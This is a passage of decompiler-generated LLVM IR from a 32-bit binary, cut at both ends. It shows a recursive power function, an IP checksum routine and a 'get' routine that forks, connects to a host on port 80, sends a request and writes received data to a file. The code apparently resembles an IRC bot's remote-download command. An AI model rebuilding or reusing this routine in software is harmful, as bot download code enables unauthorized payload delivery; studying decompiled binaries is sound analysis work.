  br label %dec_label_pc_804873f

dec_label_pc_804873f:                             ; preds = %dec_label_pc_80486ba, %dec_label_pc_8048733
  %v0_804874d = load i32, i32* @ebp, align 4
  %v4_804874d = add i32 %v3_804874d, %v0_804874d
  %v5_804874d = inttoptr i32 %v4_804874d to i32*
  %v6_804874d = load i32, i32* %v5_804874d, align 4
  %v10_804874d = and i32 %v6_804874d, %v9_80486e1
  %v11_804874d = icmp ne i32 %v10_804874d, 0
  %v4_8048758 = icmp eq i1 %v11_804874d, false
  %v1_804875a = icmp eq i1 %v4_8048758, false
  br i1 %v1_804875a, label %dec_label_pc_8048761, label %dec_label_pc_80486ba

dec_label_pc_8048761:                             ; preds = %dec_label_pc_804873f
  %v2_8048771 = ptrtoint i32* %stack_var_-1092 to i32
  store i32 %v4_80486a0, i32* %stack_var_-1260, align 4
  %v5_8048781 = call i32 @recv(i32 %v4_80486a0, i32 %v2_8048771, i32 1024, i32 0)
  %tmp28 = icmp slt i32 %v5_8048781, 1
  br i1 %tmp28, label %dec_label_pc_8048795, label %dec_label_pc_804878f

dec_label_pc_804878f:                             ; preds = %dec_label_pc_8048761
  %v7_8048793 = icmp sgt i32 %v5_8048781, 19
  br i1 %v7_8048793, label %dec_label_pc_8048795, label %dec_label_pc_80487a1

dec_label_pc_8048795:                             ; preds = %dec_label_pc_804878f, %dec_label_pc_8048761
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_804879c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80487a1

dec_label_pc_80487a1:                             ; preds = %dec_label_pc_804878f, %dec_label_pc_8048795
  %v0_80487a4 = load i32, i32* @ebp, align 4
  %v2_80487a4 = add i32 %v5_8048781, -1088
  %v3_80487a4 = add i32 %v2_80487a4, %v0_80487a4
  %v4_80487a4 = inttoptr i32 %v3_80487a4 to i8*
  store i8 0, i8* %v4_80487a4, align 1
  %v0_80487b0 = load i32, i32* @ebp, align 4
  %v2_80487b0 = add i32 %v5_8048781, -1089
  %v3_80487b0 = add i32 %v2_80487b0, %v0_80487b0
  %v4_80487b0 = inttoptr i32 %v3_80487b0 to i8*
  %v5_80487b0 = load i8, i8* %v4_80487b0, align 1
  %v10_80487b8 = icmp eq i8 %v5_80487b0, 10
  br i1 %v10_80487b8, label %dec_label_pc_80487cc, label %dec_label_pc_80487bc

dec_label_pc_80487bc:                             ; preds = %dec_label_pc_80487a1
  %v5_80487c0 = load i8, i8* %v4_80487b0, align 1
  %v10_80487c8 = icmp eq i8 %v5_80487c0, 13
  %v1_80487ca = icmp eq i1 %v10_80487c8, false
  br i1 %v1_80487ca, label %dec_label_pc_80487d8, label %dec_label_pc_80487cc

dec_label_pc_80487cc:                             ; preds = %dec_label_pc_80487bc, %dec_label_pc_80487a1
  store i8 0, i8* %v4_80487b0, align 1
  %v0_80487de.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80487d8

dec_label_pc_80487d8:                             ; preds = %dec_label_pc_80487bc, %dec_label_pc_80487cc
  %v0_8048802 = phi i32 [ %v0_80487b0, %dec_label_pc_80487bc ], [ %v0_80487de.pre, %dec_label_pc_80487cc ]
  %v2_80487de = add i32 %v5_8048781, -1090
  %v3_80487de = add i32 %v2_80487de, %v0_8048802
  %v4_80487de = inttoptr i32 %v3_80487de to i8*
  %v5_80487de = load i8, i8* %v4_80487de, align 1
  %v10_80487e6 = icmp eq i8 %v5_80487de, 10
  br i1 %v10_80487e6, label %dec_label_pc_80487fc, label %dec_label_pc_80487ea

dec_label_pc_80487ea:                             ; preds = %dec_label_pc_80487d8
  %v5_80487f0 = load i8, i8* %v4_80487de, align 1
  %v10_80487f8 = icmp eq i8 %v5_80487f0, 13
  %v1_80487fa = icmp eq i1 %v10_80487f8, false
  br i1 %v1_80487fa, label %dec_label_pc_804880a, label %dec_label_pc_80487fc

dec_label_pc_80487fc:                             ; preds = %dec_label_pc_80487ea, %dec_label_pc_80487d8
  store i8 0, i8* %v4_80487de, align 1
  br label %dec_label_pc_804880a

dec_label_pc_804880a:                             ; preds = %dec_label_pc_80487ea, %dec_label_pc_80487fc
  store i32 %v4_80486a0, i32* %stack_var_-1260, align 4
  %v3_804882b = call i32 @Send(i32 %v4_80486a0, i32 ptrtoint ([25 x i8]* @global_var_806968b.37 to i32))
  store i32 %v4_80486a0, i32* %stack_var_-1260, align 4
  %v1_8048836 = call i32 @close(i32 %v4_80486a0)
  store i32 %v4_80485f4, i32* %stack_var_-1260, align 4
  %v1_8048841 = call i32 @close(i32 %v4_80485f4)
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_804884d = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048852

dec_label_pc_8048852:                             ; preds = %dec_label_pc_8048678, %dec_label_pc_804865c, %dec_label_pc_8048606, %entry, %dec_label_pc_804880a
  %v0_804885a = phi i32 [ 0, %dec_label_pc_8048678 ], [ %v3_804866a, %dec_label_pc_804865c ], [ %v4_804864e, %dec_label_pc_8048606 ], [ %v4_80485f4, %entry ], [ %v1_804884d, %dec_label_pc_804880a ]
  ret i32 %v0_804885a

; uselistorder directives
  uselistorder i32 %v5_8048781, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v3_804874d, { 1, 0 }
  uselistorder i32 %v4_80486a0, { 5, 4, 3, 2, 7, 6, 1, 0, 8 }
  uselistorder i32 %v3_804866a, { 1, 0 }
  uselistorder i32 %v4_804864e, { 1, 0 }
  uselistorder i32 %v4_80485f4, { 1, 3, 2, 5, 4, 7, 6, 9, 8, 0 }
  uselistorder i32* %stack_var_-1260, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder label %dec_label_pc_8048852, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804880a, { 1, 0 }
  uselistorder label %dec_label_pc_80487d8, { 1, 0 }
  uselistorder label %dec_label_pc_80487a1, { 1, 0 }
  uselistorder label %dec_label_pc_804873f, { 1, 0 }
  uselistorder label %dec_label_pc_80486ba, { 1, 0 }
}

define i32 @poww(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804885b = load i32, i32* @ebp, align 4
  store i32 %v0_804885b, i32* %stack_var_-4, align 4
  %v4_804885b = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804885b, i32* @ebp, align 4
  %v4_8048861 = icmp eq i32 %arg2, 0
  %v1_8048865 = icmp eq i1 %v4_8048861, false
  br i1 %v1_8048865, label %dec_label_pc_8048870, label %dec_label_pc_804889a

dec_label_pc_8048870:                             ; preds = %entry
  %v4_8048870 = add i32 %arg2, -1
  %v12_8048870 = icmp eq i32 %v4_8048870, 0
  %v1_8048874 = icmp eq i1 %v12_8048870, false
  br i1 %v1_8048874, label %dec_label_pc_804887e, label %dec_label_pc_8048876

dec_label_pc_8048876:                             ; preds = %dec_label_pc_8048870
  %v4_8048876 = trunc i64 %arg1 to i32
  br label %dec_label_pc_804889a

dec_label_pc_804887e:                             ; preds = %dec_label_pc_8048870
  %v4_804888c = call i32 @poww(i64 %arg1, i32 %v4_8048870)
  %v6_8048893 = sext i32 %v4_804888c to i64
  %v8_8048893 = mul nsw i64 %v6_8048893, %arg1
  %v9_8048893 = trunc i64 %v8_8048893 to i32
  br label %dec_label_pc_804889a

dec_label_pc_804889a:                             ; preds = %entry, %dec_label_pc_8048876, %dec_label_pc_804887e
  %stack_var_-8.0.off0 = phi i32 [ %v9_8048893, %dec_label_pc_804887e ], [ %v4_8048876, %dec_label_pc_8048876 ], [ 1, %entry ]
  ret i32 %stack_var_-8.0.off0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i64 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804889a, { 2, 1, 0 }
}

define i32 @in_cksum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804889f = load i32, i32* @ebp, align 4
  %v4_80488d116 = add i32 %arg2, -1
  %v9_80488d117 = sub i32 0, %arg2
  %v10_80488d118 = and i32 %arg2, %v9_80488d117
  %v11_80488d119 = icmp slt i32 %v10_80488d118, 0
  %v12_80488d120 = icmp eq i32 %v4_80488d116, 0
  %v13_80488d121 = icmp slt i32 %v4_80488d116, 0
  %v3_80488d522 = icmp eq i1 %v13_80488d121, %v11_80488d119
  %v4_80488d523 = icmp eq i1 %v12_80488d120, false
  %v5_80488d524 = and i1 %v4_80488d523, %v3_80488d522
  br i1 %v5_80488d524, label %dec_label_pc_80488c0, label %dec_label_pc_80488d7

dec_label_pc_80488c0:                             ; preds = %entry, %dec_label_pc_80488c0
  %stack_var_-24.027 = phi i16 [ %v6_80488c6, %dec_label_pc_80488c0 ], [ 0, %entry ]
  %stack_var_-28.026 = phi i16* [ %v23_80488c9, %dec_label_pc_80488c0 ], [ %arg1, %entry ]
  %v3_80488cd25 = phi i32 [ %v4_80488cd, %dec_label_pc_80488c0 ], [ %arg2, %entry ]
  %v4_80488c0 = ptrtoint i16* %stack_var_-28.026 to i32
  %v2_80488c3 = load i16, i16* %stack_var_-28.026, align 2
  %v6_80488c6 = add i16 %v2_80488c3, %stack_var_-24.027
  %v5_80488c9 = add i32 %v4_80488c0, 2
  %v23_80488c9 = inttoptr i32 %v5_80488c9 to i16*
  %v4_80488cd = add i32 %v3_80488cd25, -2
  %v4_80488d1 = add i32 %v3_80488cd25, -3
  %v9_80488d1 = sub i32 2, %v3_80488cd25
  %v10_80488d1 = and i32 %v4_80488cd, %v9_80488d1
  %v11_80488d1 = icmp slt i32 %v10_80488d1, 0
  %v12_80488d1 = icmp eq i32 %v4_80488d1, 0
  %v13_80488d1 = icmp slt i32 %v4_80488d1, 0
  %v3_80488d5 = icmp eq i1 %v13_80488d1, %v11_80488d1
  %v4_80488d5 = icmp eq i1 %v12_80488d1, false
  %v5_80488d5 = and i1 %v4_80488d5, %v3_80488d5
  br i1 %v5_80488d5, label %dec_label_pc_80488c0, label %dec_label_pc_80488d7

dec_label_pc_80488d7:                             ; preds = %dec_label_pc_80488c0, %entry
  %stack_var_-28.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_80488c9, %dec_label_pc_80488c0 ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v6_80488c6, %dec_label_pc_80488c0 ]
  %v4_80488d5.lcssa = phi i1 [ %v4_80488d523, %entry ], [ %v4_80488d5, %dec_label_pc_80488c0 ]
  br i1 %v4_80488d5.lcssa, label %dec_label_pc_80488ef, label %dec_label_pc_80488dd

dec_label_pc_80488dd:                             ; preds = %dec_label_pc_80488d7
  %v1_80488e3 = bitcast i16* %stack_var_-28.0.lcssa to i8*
  %v2_80488e3 = load i8, i8* %v1_80488e3, align 1
  %v3_80488e3 = zext i8 %v2_80488e3 to i16
  %v6_80488ec = add i16 %v3_80488e3, %stack_var_-24.0.lcssa
  br label %dec_label_pc_80488ef

dec_label_pc_80488ef:                             ; preds = %dec_label_pc_80488d7, %dec_label_pc_80488dd
  %stack_var_-24.1 = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_80488d7 ], [ %v6_80488ec, %dec_label_pc_80488dd ]
  %v4_80488ef = sext i16 %stack_var_-24.1 to i32
  %v2_80488f2 = sdiv i32 %v4_80488ef, 65536
  %v2_80488f9 = add nsw i32 %v2_80488f2, %v4_80488ef
  %sext = mul i32 %v2_80488f9, 65536
  %v4_80488fe = sdiv i32 %sext, 65536
  %v2_8048901 = ashr i32 %sext, 31
  %v6_8048904 = add nsw i32 %v2_8048901, %v4_80488fe
  %sext3 = mul i32 %v6_8048904, 65536
  %tmp = sdiv i32 %sext3, -65536
  %v1_804890b = add i32 %tmp, -1
  store i32 %v0_804889f, i32* @ebp, align 4
  ret i32 %v1_804890b

; uselistorder directives
  uselistorder i32 %v4_80488ef, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_80488d1, { 1, 0 }
  uselistorder i32 %v4_80488cd, { 1, 0 }
  uselistorder label %dec_label_pc_80488ef, { 1, 0 }
  uselistorder label %dec_label_pc_80488c0, { 1, 0 }
}

define i32 @get(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804891f = load i32, i32* @esi, align 4
  store i32 %v0_804891f, i32* %stack_var_-12, align 4
  %v2_8048920 = icmp ult i32* %stack_var_-12, inttoptr (i32 5232 to i32*)
  store i1 %v2_8048920, i1* %cf.global-to-local, align 1
  %v1_804892c = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048931 = icmp eq i32 %v1_804892c, 0
  %v1_8048933 = icmp eq i1 %v1_8048931, false
  br i1 %v1_8048933, label %dec_label_pc_8048e3b, label %dec_label_pc_8048939

dec_label_pc_8048939:                             ; preds = %entry
  %v4_8048939 = add i32 %arg3, -1
  %v8_8048939 = icmp eq i32 %arg3, 0
  %v9_8048939 = sub i32 0, %arg3
  %v10_8048939 = and i32 %arg3, %v9_8048939
  %v11_8048939 = icmp slt i32 %v10_8048939, 0
  store i1 %v8_8048939, i1* %cf.global-to-local, align 1
  %v12_8048939 = icmp eq i32 %v4_8048939, 0
  %v13_8048939 = icmp slt i32 %v4_8048939, 0
  %v3_804893d = icmp eq i1 %v13_8048939, %v11_8048939
  %v4_804893d = icmp eq i1 %v12_8048939, false
  %v5_804893d = and i1 %v4_804893d, %v3_804893d
  br i1 %v5_804893d, label %dec_label_pc_8048965, label %dec_label_pc_804893f

dec_label_pc_804893f:                             ; preds = %dec_label_pc_8048939
  %v3_8048954 = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_80696a4.38 to i32))
  %v1_8048960 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048965

dec_label_pc_8048965:                             ; preds = %dec_label_pc_8048939, %dec_label_pc_804893f
  %v4_804897c = call i32 @socket(i32 2, i32 1, i32 0)
  %v8_8048984 = icmp ne i32 %v4_804897c, -1
  store i1 %v8_8048984, i1* %cf.global-to-local, align 1
  %v13_8048984 = icmp eq i32 %v4_804897c, -1
  %v1_8048988 = icmp eq i1 %v13_8048984, false
  br i1 %v1_8048988, label %dec_label_pc_80489b0, label %dec_label_pc_804898a

dec_label_pc_804898a:                             ; preds = %dec_label_pc_8048965
  %v3_804899f = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_80696c8.39 to i32))
  %v1_80489ab = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80489b0

dec_label_pc_80489b0:                             ; preds = %dec_label_pc_8048965, %dec_label_pc_804898a
  %v1_80489b3 = add i32 %arg4, 4
  %v5_80489b3 = icmp ugt i32 %arg4, -5
  store i1 %v5_80489b3, i1* %cf.global-to-local, align 1
  %v1_80489b6 = inttoptr i32 %v1_80489b3 to i32*
  %v2_80489b6 = load i32, i32* %v1_80489b6, align 4
  store i1 false, i1* @df, align 1
  %v4_80489d3 = inttoptr i32 %v2_80489b6 to i8*
  store i32 %v2_80489b6, i32* @esi, align 4
  %v7_80489e5 = call i32 @_strncmp(i8* %v4_80489d3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80696ed.40, i32 0, i32 0), i32 7)
  %v8_80489e5 = urem i32 %v7_80489e5, 2
  %v9_80489e5 = icmp eq i32 %v8_80489e5, 0
  %v0_80489e7 = load i1, i1* %cf.global-to-local, align 1
  %v2_80489e7 = or i1 %v0_80489e7, %v9_80489e5
  %v3_80489e7 = zext i1 %v2_80489e7 to i32
  %v4_80489e7 = load i32, i32* @edx, align 4
  %v5_80489e7 = and i32 %v4_80489e7, -256
  %v6_80489e7 = or i32 %v3_80489e7, %v5_80489e7
  %v7_80489e7 = xor i32 %v6_80489e7, 1
  store i32 %v7_80489e7, i32* %edx.global-to-local, align 4
  %v1_80489ef = trunc i32 %v7_80489e7 to i8
  %v3_80489ef = zext i1 %v0_80489e7 to i8
  %v15_80489ef = icmp eq i8 %v1_80489ef, %v3_80489ef
  %v1_80489f8 = icmp eq i1 %v15_80489ef, false
  store i1 %v5_80489b3, i1* %cf.global-to-local, align 1
  %v2_8048a1f = load i32, i32* %v1_80489b6, align 4
  br i1 %v1_80489f8, label %dec_label_pc_8048a19, label %dec_label_pc_80489fa

dec_label_pc_80489fa:                             ; preds = %dec_label_pc_80489b0
  %v1_8048a02 = add i32 %v2_8048a1f, 7
  %v5_8048a02 = icmp ugt i32 %v2_8048a1f, -8
  store i1 %v5_8048a02, i1* %cf.global-to-local, align 1
  %v2_8048a09 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048a09, i32* @eax, align 4
  %v3_8048a12 = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048a12 = call i32 @strcpy(i8* %v3_8048a12, i32 %v1_8048a02)
  br label %dec_label_pc_8048a33

dec_label_pc_8048a19:                             ; preds = %dec_label_pc_80489b0
  %v2_8048a25 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048a25, i32* @eax, align 4
  %v3_8048a2e = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048a2e = call i32 @strcpy(i8* %v3_8048a2e, i32 %v2_8048a1f)
  br label %dec_label_pc_8048a33

dec_label_pc_8048a33:                             ; preds = %dec_label_pc_80489fa, %dec_label_pc_8048a19
  %v4_8048a56.pre-phi = phi i8* [ %v3_8048a12, %dec_label_pc_80489fa ], [ %v3_8048a2e, %dec_label_pc_8048a19 ]
  %v2_8048a42.pre-phi = phi i32 [ %v2_8048a09, %dec_label_pc_80489fa ], [ %v2_8048a25, %dec_label_pc_8048a19 ]
  br label %dec_label_pc_8048a3f

dec_label_pc_8048a3c:                             ; preds = %dec_label_pc_8048a67
  %v4_8048a3c = add i32 %storemerge6, 1
  br label %dec_label_pc_8048a3f

dec_label_pc_8048a3f:                             ; preds = %dec_label_pc_8048a33, %dec_label_pc_8048a3c
  %storemerge6 = phi i32 [ %v4_8048a3c, %dec_label_pc_8048a3c ], [ 0, %dec_label_pc_8048a33 ]
  store i32 %storemerge6, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8048a42.pre-phi, i32* @edi, align 4
  %v3_8048a5c = call i32 @_strlen(i8* %v4_8048a56.pre-phi)
  %v0_8048a63 = load i32, i32* @edx, align 4
  %v7_8048a63 = icmp ult i32 %v0_8048a63, %v3_8048a5c
  store i1 %v7_8048a63, i1* %cf.global-to-local, align 1
  %v1_8048a65 = icmp eq i1 %v7_8048a63, false
  br i1 %v1_8048a65, label %dec_label_pc_8048a3f.dec_label_pc_8048a76_crit_edge, label %dec_label_pc_8048a67

dec_label_pc_8048a3f.dec_label_pc_8048a76_crit_edge: ; preds = %dec_label_pc_8048a3f
  %v0_8048a79.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge6, -1092
  br label %dec_label_pc_8048a76

dec_label_pc_8048a67:                             ; preds = %dec_label_pc_8048a3f
  %v0_8048a6a = load i32, i32* @ebp, align 4
  %v2_8048a6a = add i32 %storemerge6, -1092
  %v3_8048a6a = add i32 %v0_8048a6a, %v2_8048a6a
  %v4_8048a6a = inttoptr i32 %v3_8048a6a to i8*
  %v5_8048a6a = load i8, i8* %v4_8048a6a, align 1
  %v6_8048a72 = icmp ult i8 %v5_8048a6a, 47
  store i1 %v6_8048a72, i1* %cf.global-to-local, align 1
  %v10_8048a72 = icmp eq i8 %v5_8048a6a, 47
  %v1_8048a74 = icmp eq i1 %v10_8048a72, false
  br i1 %v1_8048a74, label %dec_label_pc_8048a3c, label %dec_label_pc_8048a76

dec_label_pc_8048a76:                             ; preds = %dec_label_pc_8048a67, %dec_label_pc_8048a3f.dec_label_pc_8048a76_crit_edge
  %v2_8048a79.pre-phi = phi i32 [ %.pre, %dec_label_pc_8048a3f.dec_label_pc_8048a76_crit_edge ], [ %v2_8048a6a, %dec_label_pc_8048a67 ]
  %v0_8048a79 = phi i32 [ %v0_8048a79.pre, %dec_label_pc_8048a3f.dec_label_pc_8048a76_crit_edge ], [ %v0_8048a6a, %dec_label_pc_8048a67 ]
  %v3_8048a79 = add i32 %v0_8048a79, %v2_8048a79.pre-phi
  %v4_8048a79 = inttoptr i32 %v3_8048a79 to i8*
  store i8 0, i8* %v4_8048a79, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v2_8048a8e = call i32 @htons(i16 80)
  %v1_8048aa3 = call i32 @inet_addr(i32 %v2_8048a42.pre-phi)
  %v8_8048aab = icmp ne i32 %v1_8048aa3, -1
  store i1 %v8_8048aab, i1* %cf.global-to-local, align 1
  %v13_8048aab = icmp eq i32 %v1_8048aa3, -1
  %v1_8048aaf = icmp eq i1 %v13_8048aab, false
  br i1 %v1_8048aaf, label %dec_label_pc_8048b0d, label %dec_label_pc_8048ab1

dec_label_pc_8048ab1:                             ; preds = %dec_label_pc_8048a76
  %v1_8048aba = call i32 @__GI_gethostbyname(i32 %v2_8048a42.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8048ac2 = icmp eq i32 %v1_8048aba, 0
  %v1_8048ac6 = icmp eq i1 %v4_8048ac2, false
  br i1 %v1_8048ac6, label %dec_label_pc_8048aee, label %dec_label_pc_8048ac8

dec_label_pc_8048ac8:                             ; preds = %dec_label_pc_8048ab1
  %v3_8048add = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_80696f8.41 to i32))
  %v1_8048ae9 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048aee

dec_label_pc_8048aee:                             ; preds = %dec_label_pc_8048ab1, %dec_label_pc_8048ac8
  %v1_8048af1 = add i32 %v1_8048aba, 12
  %v2_8048af1 = inttoptr i32 %v1_8048af1 to i32*
  %v3_8048af1 = load i32, i32* %v2_8048af1, align 4
  %v1_8048af9 = add i32 %v1_8048aba, 16
  %v2_8048af9 = inttoptr i32 %v1_8048af9 to i32*
  %v3_8048af9 = load i32, i32* %v2_8048af9, align 4
  %v1_8048afc = inttoptr i32 %v3_8048af9 to i32*
  %v2_8048afc = load i32, i32* %v1_8048afc, align 4
  store i32 %v2_8048afc, i32* %edx.global-to-local, align 4
  %v5_8048b01 = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8048b01, i1* %cf.global-to-local, align 1
  %v15_8048b01 = ptrtoint i32* %stack_var_-68 to i32
  %tmp66 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8048b01, i32* @edi, align 4
  %v1_8048b06 = inttoptr i32 %v2_8048afc to i8*
  store i32 %v2_8048afc, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8048b09 = call i8* @_memcpy(i8* %tmp66, i8* %v1_8048b06, i32 %v3_8048af1)
  %v8_8048b09 = ptrtoint i8* %v7_8048b09 to i32
  store i32 %v8_8048b09, i32* @ecx, align 4
  br label %dec_label_pc_8048b13

dec_label_pc_8048b0d:                             ; preds = %dec_label_pc_8048a76
  store i32 %v1_8048aa3, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8048b13

dec_label_pc_8048b13:                             ; preds = %dec_label_pc_8048aee, %dec_label_pc_8048b0d
  %v2_8048b13.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8048b16 = icmp ugt i32* %stack_var_-72, inttoptr (i32 -9 to i32*)
  store i1 %v5_8048b16, i1* %cf.global-to-local, align 1
  %v4_8048b3b = call i32 @connect(i32 %v4_804897c, i32 %v2_8048b13.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048b40 = icmp eq i32 %v4_8048b3b, 0
  br i1 %v1_8048b40, label %dec_label_pc_8048b6a, label %dec_label_pc_8048b44

dec_label_pc_8048b44:                             ; preds = %dec_label_pc_8048b13
  %v3_8048b59 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8069720.42 to i32))
  %v1_8048b65 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048b6a

dec_label_pc_8048b6a:                             ; preds = %dec_label_pc_8048b13, %dec_label_pc_8048b44
  %v2_8048b75 = add i32 %storemerge6, %v2_8048a42.pre-phi
  %v7_8048b75 = icmp ult i32 %v2_8048b75, %v2_8048a42.pre-phi
  store i1 %v7_8048b75, i1* %cf.global-to-local, align 1
  %v1_8048b77 = add i32 %v2_8048b75, 1
  store i32 %v1_8048b77, i32* %edx.global-to-local, align 4
  %v3_8048b96 = call i32 @Send(i32 %v4_804897c, i32 ptrtoint ([276 x i8]* @global_var_8069748.43 to i32))
  %v3_8048bb0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806985c.44 to i32))
  %v1_8048bb8 = add i32 %arg4, 8
  %v5_8048bb8 = icmp ugt i32 %arg4, -9
  store i1 %v5_8048bb8, i1* %cf.global-to-local, align 1
  %v1_8048bbb = inttoptr i32 %v1_8048bb8 to i32*
  %v2_8048bbb = load i32, i32* %v1_8048bbb, align 4
  store i32 %v2_8048bbb, i32* @eax, align 4
  %v3_8048bc8 = call i32 @__GI_fopen(i32 %v2_8048bbb, i32 ptrtoint ([3 x i8]* @global_var_8069878.45 to i32))
  %v2_8048be0 = ptrtoint i32* %stack_var_-5192 to i32
  %v5_8048bf0108 = call i32 @recv(i32 %v4_804897c, i32 %v2_8048be0, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp67111 = icmp slt i32 %v5_8048bf0108, 1
  br i1 %tmp67111, label %dec_label_pc_8048d18.loopexit12, label %dec_label_pc_8048c02

dec_label_pc_8048bd0.loopexit:                    ; preds = %dec_label_pc_8048d04
  %v5_8048bf0 = call i32 @recv(i32 %v4_804897c, i32 %v2_8048be0, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp67 = icmp slt i32 %v5_8048bf0, 1
  br i1 %tmp67, label %dec_label_pc_8048d18.loopexit12, label %dec_label_pc_8048c02

dec_label_pc_8048c02:                             ; preds = %dec_label_pc_8048b6a, %dec_label_pc_8048bd0.loopexit
  %v5_8048bf0112 = phi i32 [ %v5_8048bf0, %dec_label_pc_8048bd0.loopexit ], [ %v5_8048bf0108, %dec_label_pc_8048b6a ]
  %v4_8048c02 = add i32 %v5_8048bf0112, -4095
  %v8_8048c02 = icmp ult i32 %v5_8048bf0112, 4095
  %v9_8048c02 = sub i32 4094, %v5_8048bf0112
  %v10_8048c02 = and i32 %v9_8048c02, %v5_8048bf0112
  %v11_8048c02 = icmp slt i32 %v10_8048c02, 0
  store i1 %v8_8048c02, i1* %cf.global-to-local, align 1
  %v12_8048c02 = icmp eq i32 %v4_8048c02, 0
  %v13_8048c02 = icmp slt i32 %v4_8048c02, 0
  %v3_8048c09 = icmp eq i1 %v13_8048c02, %v11_8048c02
  %v4_8048c09 = icmp eq i1 %v12_8048c02, false
  %v5_8048c09 = and i1 %v4_8048c09, %v3_8048c09
  br i1 %v5_8048c09, label %dec_label_pc_8048c22.lr.ph, label %dec_label_pc_8048c0b

dec_label_pc_8048c0b:                             ; preds = %dec_label_pc_8048c02
  %v0_8048c0e = load i32, i32* @ebp, align 4
  %v2_8048c0e = add i32 %v5_8048bf0112, -5188
  %v3_8048c0e = add i32 %v2_8048c0e, %v0_8048c0e
  %v4_8048c0e = inttoptr i32 %v3_8048c0e to i8*
  store i8 0, i8* %v4_8048c0e, align 1
  br label %dec_label_pc_8048c22.lr.ph

dec_label_pc_8048c22.lr.ph:                       ; preds = %dec_label_pc_8048c0b, %dec_label_pc_8048c02
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048c22

dec_label_pc_8048c22:                             ; preds = %dec_label_pc_8048c22.lr.ph, %dec_label_pc_8048d04
  %storemerge5107 = phi i32 [ 0, %dec_label_pc_8048c22.lr.ph ], [ %v4_8048d04, %dec_label_pc_8048d04 ]
  store i32 %storemerge5107, i32* %edx.global-to-local, align 4
  %v2_8048c2d = add i32 %storemerge5107, %v2_8048be0
  %v7_8048c2d = icmp ult i32 %v2_8048c2d, %v2_8048be0
  store i1 %v7_8048c2d, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8048c4a = inttoptr i32 %v2_8048c2d to i8*
  store i32 %v2_8048c2d, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_806987b.46 to i32), i32* @edi, align 4
  %v7_8048c5c = call i32 @_strncmp(i8* %v4_8048c4a, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806987b.46, i32 0, i32 0), i32 4)
  %v8_8048c5c = urem i32 %v7_8048c5c, 2
  %v9_8048c5c = icmp eq i32 %v8_8048c5c, 0
  %v0_8048c5e = load i1, i1* %cf.global-to-local, align 1
  %v2_8048c5e = or i1 %v0_8048c5e, %v9_8048c5c
  %v3_8048c5e = zext i1 %v2_8048c5e to i32
  %v4_8048c5e = load i32, i32* %edx.global-to-local, align 4
  %v5_8048c5e = and i32 %v4_8048c5e, -256
  %v6_8048c5e = or i32 %v3_8048c5e, %v5_8048c5e
  %v7_8048c5e = xor i32 %v6_8048c5e, 1
  store i32 %v7_8048c5e, i32* %edx.global-to-local, align 4
  %v3_8048c64 = and i32 %v7_8048c5c, -256
  %v1_8048c66 = trunc i32 %v7_8048c5e to i8
  %v3_8048c66 = zext i1 %v0_8048c5e to i8
